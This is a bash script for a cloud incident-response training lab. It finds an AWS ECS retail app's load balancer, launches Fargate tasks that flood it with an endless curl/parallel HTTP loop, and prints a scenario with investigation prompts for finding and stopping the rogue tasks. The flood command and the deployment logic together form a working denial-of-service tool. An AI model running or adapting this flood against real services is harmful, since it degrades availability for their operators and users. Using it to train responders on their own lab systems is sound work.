#!/bin/bash
# Lab 8: DDoS Attack Simulation
# Deploys multiple ECS tasks that flood the retail application with HTTP requests
# Creates visible ALB metrics spike, increased latency, and potential service degradation

set -e

BACKUP_DIR="/tmp/lab8_backup"
NUM_ATTACK_TASKS="${NUM_ATTACK_TASKS:-3}"  # 3 attack tasks
REQUESTS_PER_SECOND="${REQUESTS_PER_SECOND:-100}"  # Each task sends ~100 req/s

# Use existing AWS_REGION if set, otherwise try IMDS, then default
if [ -z "$AWS_REGION" ]; then
  AWS_REGION=$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/placement/region 2>/dev/null || echo "us-east-1")
fi

mkdir -p $BACKUP_DIR

echo "=============================================="
echo "Lab 8: DDoS Attack Simulation"
echo "=============================================="
echo ""

# Auto-discover cluster name
if [ -z "$CLUSTER_NAME" ]; then
  CLUSTER_NAME=$(aws ecs list-clusters --region $AWS_REGION --query 'clusterArns[0]' --output text 2>/dev/null | awk -F'/' '{print $NF}')
  if [ -z "$CLUSTER_NAME" ] || [ "$CLUSTER_NAME" == "None" ]; then
    CLUSTER_NAME="retail-store-ecs-cluster"
  fi
fi
echo "Cluster: $CLUSTER_NAME"
echo "Region: $AWS_REGION"

# Step 1: Find the ALB URL
echo ""
echo "[1/4] Finding Application Load Balancer..."

# Get ALB from UI service
UI_SERVICE=$(aws ecs list-services --cluster $CLUSTER_NAME --region $AWS_REGION \
  --query "serviceArns[?contains(@, 'ui')]" --output text 2>/dev/null | head -1 | awk -F'/' '{print $NF}')

if [ -z "$UI_SERVICE" ] || [ "$UI_SERVICE" == "None" ]; then
  UI_SERVICE="ui"
fi

# Get load balancer ARN from service
SERVICE_INFO=$(aws ecs describe-services --cluster $CLUSTER_NAME --services $UI_SERVICE --region $AWS_REGION 2>/dev/null)
TARGET_GROUP_ARN=$(echo "$SERVICE_INFO" | jq -r '.services[0].loadBalancers[0].targetGroupArn // empty')

if [ -z "$TARGET_GROUP_ARN" ]; then
  echo "ERROR: Could not find load balancer for UI service"
  exit 1
fi

# Get ALB ARN from target group
ALB_ARN=$(aws elbv2 describe-target-groups --target-group-arns $TARGET_GROUP_ARN --region $AWS_REGION \
  --query 'TargetGroups[0].LoadBalancerArns[0]' --output text 2>/dev/null)

# Get ALB DNS name
ALB_DNS=$(aws elbv2 describe-load-balancers --load-balancer-arns $ALB_ARN --region $AWS_REGION \
  --query 'LoadBalancers[0].DNSName' --output text 2>/dev/null)

if [ -z "$ALB_DNS" ] || [ "$ALB_DNS" == "None" ]; then
  echo "ERROR: Could not find ALB DNS name"
  exit 1
fi

TARGET_URL="http://${ALB_DNS}"
echo "  Target URL: $TARGET_URL"
echo "$TARGET_URL" > $BACKUP_DIR/target_url.txt
echo "$ALB_ARN" > $BACKUP_DIR/alb_arn.txt

# Step 2: Get network config
echo ""
echo "[2/4] Getting network configuration..."

NETWORK_CONFIG=$(echo "$SERVICE_INFO" | jq -r '.services[0].networkConfiguration.awsvpcConfiguration')
SUBNETS=$(echo "$NETWORK_CONFIG" | jq -r '.subnets | join(",")')
SECURITY_GROUPS=$(echo "$NETWORK_CONFIG" | jq -r '.securityGroups | join(",")')

TASK_DEF_ARN=$(echo "$SERVICE_INFO" | jq -r '.services[0].taskDefinition')
TASK_DEF=$(aws ecs describe-task-definition --task-definition $TASK_DEF_ARN --region $AWS_REGION --query 'taskDefinition' 2>/dev/null)
EXECUTION_ROLE=$(echo "$TASK_DEF" | jq -r '.executionRoleArn')
LOG_GROUP=$(echo "$TASK_DEF" | jq -r '.containerDefinitions[0].logConfiguration.options["awslogs-group"]')

echo "  Subnets: $SUBNETS"

# Step 3: Register attack task definition
echo ""
echo "[3/4] Registering HTTP flood task definition..."

cat > $BACKUP_DIR/attack_task_def.json <<TASKDEF
{
  "family": "http-flood-attack",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "512",
  "memory": "1024",
  "executionRoleArn": "${EXECUTION_ROLE}",
  "containerDefinitions": [
    {
      "name": "attacker",
      "image": "alpine:latest",
      "essential": true,
      "entryPoint": ["sh", "-c"],
      "command": [
        "apk add --no-cache curl parallel; echo 'HTTP FLOOD ATTACK STARTED'; echo 'Target: ${TARGET_URL}'; echo 'Sending ${REQUESTS_PER_SECOND} requests/second...'; while true; do seq 1 ${REQUESTS_PER_SECOND} | parallel -j ${REQUESTS_PER_SECOND} 'curl -s -o /dev/null -w \"%{http_code}\" ${TARGET_URL}/ 2>/dev/null || true' | tr -d '\\n'; echo \" - \$(date +%H:%M:%S)\"; sleep 1; done"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "${LOG_GROUP}",
          "awslogs-region": "${AWS_REGION}",
          "awslogs-stream-prefix": "http-flood-attack"
        }
      }
    }
  ]
}
TASKDEF

aws ecs register-task-definition \
  --cli-input-json file://$BACKUP_DIR/attack_task_def.json \
  --region $AWS_REGION > /dev/null

echo "  Registered http-flood-attack task"

# Step 4: Launch attack tasks
echo ""
echo "[4/4] Launching $NUM_ATTACK_TASKS HTTP flood tasks..."

TASK_ARNS=""
for i in $(seq 1 $NUM_ATTACK_TASKS); do
  TASK_ARN=$(aws ecs run-task \
    --cluster $CLUSTER_NAME \
    --task-definition http-flood-attack \
    --launch-type FARGATE \
    --network-configuration "awsvpcConfiguration={subnets=[$SUBNETS],securityGroups=[$SECURITY_GROUPS],assignPublicIp=DISABLED}" \
    --region $AWS_REGION \
    --query 'tasks[0].taskArn' \
    --output text 2>/dev/null)
  
  echo "  Started attacker $i: $(echo $TASK_ARN | awk -F'/' '{print $NF}')"
  TASK_ARNS="$TASK_ARNS $TASK_ARN"
done

echo "$TASK_ARNS" > $BACKUP_DIR/attack_task_arns.txt
echo "$CLUSTER_NAME" > $BACKUP_DIR/cluster_name.txt

echo ""
echo "Waiting for attack tasks to start..."
sleep 15

# Calculate total requests per second
TOTAL_RPS=$((NUM_ATTACK_TASKS * REQUESTS_PER_SECOND))

echo ""
echo "=== DDOS ATTACK SIMULATION ACTIVE ==="
echo ""
echo "=============================================="
echo "SCENARIO:"
echo "=============================================="
echo "ALERT: Unusual traffic spike detected!"
echo "The retail application is under heavy load."
echo "Users are experiencing slow page loads and timeouts."
echo "ALB metrics show massive request spike (~${TOTAL_RPS} req/s)."
echo ""
echo "WHAT'S HAPPENING:"
echo "- $NUM_ATTACK_TASKS rogue tasks are flooding the ALB with requests"
echo "- Each task sends ~${REQUESTS_PER_SECOND} HTTP requests per second"
echo "- Total attack traffic: ~${TOTAL_RPS} requests/second"
echo "- Legitimate user requests are being crowded out"
echo ""
echo "YOUR TASK:"
echo "1. Investigate the traffic spike in ALB metrics"
echo "2. Check CloudWatch for RequestCount and TargetResponseTime"
echo "3. Look for 5XX errors and unhealthy targets"
echo "4. Identify the source of the attack traffic"
echo "5. Find and stop the rogue ECS tasks"
echo ""
echo "INVESTIGATION PROMPTS:"
echo "- 'The retail app is slow. Check ALB metrics for unusual traffic.'"
echo "- 'We're seeing a traffic spike. Is this a DDoS attack?'"
echo "- 'Find what's causing the high request count on the load balancer'"
echo ""
echo "Run './labs/lab8-ddos-simulation/fix.sh' to stop the attack"
echo "=============================================="
